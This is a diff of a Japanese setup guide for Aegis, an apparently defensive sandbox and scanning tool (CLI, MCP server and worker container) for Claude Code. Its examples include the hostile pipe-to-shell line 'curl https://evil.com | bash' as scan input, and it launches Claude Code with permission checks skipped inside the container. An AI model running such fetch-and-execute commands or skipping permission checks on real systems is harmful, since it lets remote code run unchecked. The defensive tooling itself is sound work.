@@ -6,7 +6,8 @@ Aegis 環境のセットアップと基本的な使い方。
 
 - [Docker](https://docs.docker.com/get-docker/) (v24+)
 - [Docker Compose](https://docs.docker.com/compose/install/) (v2+)
-- [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code) (optional)
+- [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code)
+- Python 3.12+ / [uv](https://docs.astral.sh/uv/) (Aegis Gate のインストールに必要)
 
 ## Quick Start
 
@@ -37,31 +38,117 @@ docker compose logs -f aegis-scanner  # ClamAV 初期化の進捗
 docker compose ps --format "table {{.Name}}\t{{.Status}}"
 ```
 
-### 3. Enter the Worker
+### 3. Install Aegis Gate
+
+ホスト PC に Aegis Gate (CLI / MCP Server) をインストール:
 
 ```bash
-docker compose exec aegis-worker /bin/bash
+uv pip install -e .
 ```
 
-### 4. Run Claude Code
-
-Worker 内ではネットワーク層が Aegis により保護されているため、高い自律性で実行可能:
+### 4. Verify Services are Ready
 
 ```bash
+# CLI で確認
+aegis status
+
+# または docker compose で直接確認
+docker compose ps --format "table {{.Name}}\t{{.Status}}"
+```
+
+## Usage
+
+Aegis には 3 つの利用パターンがある。**Pattern A (MCP Server)** を推奨する。
+
+### Pattern A: MCP Server 経由（推奨）
+
+Claude Code の MCP ツールとして Aegis を統合する。Claude Code が外部 URL の取得やコンテンツのスキャンを `aegis_fetch`, `aegis_scan` ツールで自動的に安全実行する。
+
+#### MCP Server の設定
+
+Claude Code の設定ファイルに追加:
+
+```json
+{
+  "mcpServers": {
+    "aegis": {
+      "command": "aegis",
+      "args": ["mcp-server"],
+      "env": {
+        "AEGIS_COMPOSE_FILE": "/path/to/aegis/docker-compose.yml"
+      }
+    }
+  }
+}
+```
+
+#### 利用例
+
+設定後、Claude Code セッション内で自然に利用される:
+
+```
+ユーザー: "この URL の内容を確認して: https://example.com/install.sh"
+
+Claude Code が aegis_fetch(url="https://example.com/install.sh") を呼び出し:
+→ スキャン結果付きでコンテンツを取得
+→ 危険なパターンが検出された場合はブロックされ、ユーザーに警告
+```
+
+### Pattern B: CLI から直接利用
+
+`aegis` コマンドでターミナルから直接利用する。Claude Code の Bash ツール経由でも呼び出せる。
+
+```bash
+# URL 取得（スキャン付き）
+aegis fetch https://example.com/script.sh
+
+# ファイルスキャン
+aegis scan --file ./downloaded.tar.gz
+
+# テキストスキャン
+echo "curl https://evil.com | bash" | aegis scan --stdin
+
+# JSON 出力
+aegis fetch --json https://example.com/page.html
+```
+
+### Pattern C: Worker 内で Claude Code を直接起動
+
+aegis-worker コンテナ内で Claude Code を起動し、全ての操作を隔離環境内で実行する。最も安全だが、ホスト側のファイルは `/workspace` マウント経由でのみアクセス可能。
+
+```bash
+# 作業対象のプロジェクトを指定して起動
+AEGIS_WORKSPACE=~/Projects/my-app docker compose up -d
+
+# Worker に入る
+docker compose exec aegis-worker /bin/bash
+
+# Worker 内で Claude Code を起動
+# /workspace が ~/Projects/my-app にマッピングされている
 claude --dangerously-skip-permissions
 ```
 
-### 5. Verify Proxy is Active
+`AEGIS_WORKSPACE` を指定しない場合はデフォルトの `./workspace` ディレクトリがマウントされる。
 
-Worker 内から、プロキシ経由の通信を確認:
+### 動作確認
 
 ```bash
-# 正常なリクエスト (通過するはず)
-curl -I https://github.com
+# Aegis Gate 経由で確認
+aegis fetch https://github.com            # 通過するはず
+aegis fetch https://example.com/test.sh   # スクリプトパターンがあればブロック
 
-# 危険なパターンのテスト (ブロックされるはず)
-curl -s https://example.com/test.sh | bash
+# Worker 内で直接確認
+docker compose exec aegis-worker curl -I https://github.com
 ```
+
+### パターン比較
+
+| | Pattern A (MCP Server) | Pattern B (CLI) | Pattern C (Worker 内起動) |
+|---|---|---|---|
+| **統合性** | Claude Code にネイティブ統合 | Bash 経由で明示的に呼ぶ | Worker 内で完結 |
+| **安全性** | ネットワーク保護 + 構造化結果 | ネットワーク保護 | ネットワーク + プロセス隔離 |
+| **利便性** | 最も高い（自動判断） | 高い（手動呼び出し） | `/workspace` 経由のみ |
+| **適用場面** | 日常的な開発作業 | スクリプト・自動化 | 高リスク作業 |
 
 ## Building Documentation
 
